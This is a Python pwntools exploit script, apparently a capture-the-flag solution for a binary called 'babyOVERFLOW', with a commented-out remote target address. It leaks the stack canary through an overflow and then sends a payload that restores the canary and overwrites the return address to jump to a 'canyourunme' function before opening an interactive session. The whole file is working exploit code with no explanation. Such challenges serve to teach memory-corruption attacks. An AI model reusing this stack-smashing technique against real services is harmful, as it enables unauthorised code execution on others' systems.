from pwn import *

file_name = 'babyOVERFLOW'
target = ELF(file_name)
s = process('./' + file_name)
# s = remote('125.235.240.171', 1337)

def pwn():
	# pause()
	canyourunme = 0x00000000004005EB
	payload = 'A'*(0x48)
	s.sendline(payload)
	s.recvuntil('\n')
	res = s.recv(8)[:-1]
	cookie = u64(res.rjust(8, '\x00'))
	print hex(cookie)

	payload = '\x00' + 'A'*(0x48-1) + p64(cookie) + p64(0) + p64(canyourunme)
	s.sendline(payload)
	s.interactive()

pwn()
